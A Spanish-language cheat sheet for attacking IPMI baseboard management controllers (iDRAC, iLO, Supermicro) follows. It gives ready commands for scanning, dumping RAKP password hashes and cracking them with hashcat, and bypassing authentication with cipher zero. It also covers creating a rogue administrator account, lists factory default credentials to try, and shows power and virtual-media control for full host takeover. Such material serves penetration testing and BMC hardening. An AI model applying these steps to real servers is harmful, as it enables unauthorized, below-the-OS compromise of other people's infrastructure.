---
tipo: meta
aliases:
  - IPMI - matriz
  - ipmi cheatsheet
  - BMC - matriz
tags:
  - meta/referencia
  - dominio/red
---

# IPMI - matriz de referencia

> [!info] Referencia pura, no un zettel
> **Puerto: 623/udp** (RMCP). IPMI es la interfaz de gestión de los **BMC** —los controladores fuera de banda de un server: Dell iDRAC, HP iLO, Supermicro—. Es **UDP** → nmap con `-sU`. Dos ataques hacen el dominio: el volcado de hash RAKP y el cipher zero. Criterio de recon en [[MOC - Reconocimiento de red]].

`HOST`, `u`, `p` son marcadores.

## Reconocimiento

| Comando | Qué da |
|---|---|
| `nmap -sU -p623 --script "ipmi-version,ipmi-cipher-zero" HOST` | Versión de IPMI y si acepta cipher 0 |
| `msf> use auxiliary/scanner/ipmi/ipmi_version` | Ídem por Metasploit |

## Volcado de hash RAKP (el clásico)

Fallo de diseño de IPMI 2.0 (CVE-2013-4786): durante la autenticación, el BMC **le manda a cualquier cliente** un hash HMAC del password del usuario. Se pide y se crackea offline — no hace falta credencial previa.

| Paso | Comando |
|---|---|
| Volcar los hashes | `msf> use auxiliary/scanner/ipmi/ipmi_dumphashes` |
| Crackear | `hashcat -m 7300 hashes.txt wordlist.txt` |

El modo `7300` de hashcat es exactamente "IPMI2 RAKP HMAC-SHA1". Con un usuario válido (`ADMIN`, `root`) y una contraseña débil, es acceso total al BMC.

## Cipher Zero — bypass de autenticación

Algunos BMC aceptan el "cipher suite 0", que **no valida la contraseña**: con un usuario válido se entra sin saberla.

| Paso | Comando |
|---|---|
| Comprobar | `msf> use auxiliary/scanner/ipmi/ipmi_cipher_zero` |
| Usar (listar usuarios) | `ipmitool -I lanplus -C 0 -H HOST -U ADMIN -P '' user list` |
| Crear un admin | `ipmitool -I lanplus -C 0 -H HOST -U ADMIN -P '' user set name 5 hacker` … `user set password 5 P4ss` … `channel setaccess 1 5 ipmi=on privilege=4` |

## Credenciales por defecto

Los BMC salen de fábrica con credenciales conocidas — probar siempre.

| Fabricante | Usuario / contraseña |
|---|---|
| Supermicro | `ADMIN` / `ADMIN` |
| Dell iDRAC | `root` / `calvin` |
| HP iLO | `Administrator` / (8 chars aleatorios en la etiqueta física) |
| IBM IMM | `USERID` / `PASSW0RD` (con cero) |

## Post-acceso (ipmitool)

| Tarea | Comando |
|---|---|
| Autenticado | `ipmitool -I lanplus -H HOST -U u -P p user list` |
| Info del BMC | `ipmitool -I lanplus -H HOST -U u -P p lan print` |
| Encender/apagar/resetear | `ipmitool ... chassis power [on\|off\|cycle]` |

El BMC es control físico total: consola KVM, montar **virtual media** y bootear un medio del atacante, o resetear la contraseña del SO — compromiso del host completo por debajo del sistema operativo.

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| nada en 623 | UDP filtrado, o BMC apagado | confirmar con `nmap -sU`; el BMC vive aunque el host esté apagado |
| RAKP sin hashes | usuario inexistente | probar `ADMIN`, `root`, `Administrator` |
| cipher 0 rechazado | el BMC lo deshabilitó (parcheado) | pasar a RAKP + crack, o defaults |
| `Error: Unable to establish LAN session` | falta `-I lanplus` o versión distinta | forzar `-I lanplus` (IPMI 2.0) |
